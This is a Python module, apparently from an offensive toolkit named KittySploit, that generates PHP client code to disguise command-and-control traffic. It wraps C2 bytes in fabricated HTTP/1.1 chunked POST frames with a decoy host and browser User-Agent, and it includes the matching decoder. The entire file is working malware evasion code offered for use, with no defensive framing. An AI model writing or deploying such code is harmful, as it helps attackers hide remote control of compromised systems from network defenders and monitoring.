#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Optional
from modules.obfuscators.python.protocol.http_chunked import Module as PythonHttpChunkedObfuscator


class Module(PythonHttpChunkedObfuscator):
    """PHP HTTP chunked transfer mimic obfuscator."""

    SUPPORTED_CLIENT_LANGUAGES = ["php"]

    __info__ = {
        "name": "PHP HTTP Chunked Mimic Obfuscator",
        "description": "Wraps C2 bytes in HTTP/1.1 chunked transfer frames and emits PHP client code.",
        "author": "KittySploit Team",
        "version": "1.0.0",
    }

    def generate_client_code(self, language: str) -> Optional[str]:
        if language != "php":
            return None
        return (
            "$obf_buf='';$obf_first=true;"
            "function _obf_encode($d){global $obf_first;if($d===''){return $d;}$out='';"
            "if($obf_first){$out=\"POST /api/events HTTP/1.1\\r\\nHost: update.local\\r\\nUser-Agent: Mozilla/5.0\\r\\nContent-Type: application/octet-stream\\r\\nTransfer-Encoding: chunked\\r\\nConnection: keep-alive\\r\\n\\r\\n\";$obf_first=false;}"
            "$i=0;$l=strlen($d);while($i<$l){$c=substr($d,$i,16384);$i+=strlen($c);$out.=dechex(strlen($c)).\"\\r\\n\".$c.\"\\r\\n\";}return $out;}"
            "function _obf_decode($d){global $obf_buf;$obf_buf.=$d;$out='';"
            "while($obf_buf!==''){if(strncmp($obf_buf,'HTTP/',5)===0||strncmp($obf_buf,'POST ',5)===0||strncmp($obf_buf,'GET ',4)===0){$e=strpos($obf_buf,\"\\r\\n\\r\\n\");if($e===false){break;}$obf_buf=substr($obf_buf,$e+4);continue;}"
            "$p=strpos($obf_buf,\"\\r\\n\");if($p===false){break;}$line=trim(explode(';',substr($obf_buf,0,$p),2)[0]);$ln=hexdec($line);"
            "if($line===''||$ln>16384){$obf_buf=substr($obf_buf,1);continue;}$frame=$p+2+$ln+2;if(strlen($obf_buf)<$frame){break;}"
            "$out.=substr($obf_buf,$p+2,$ln);$obf_buf=substr($obf_buf,$frame);}return $out;}"
        )
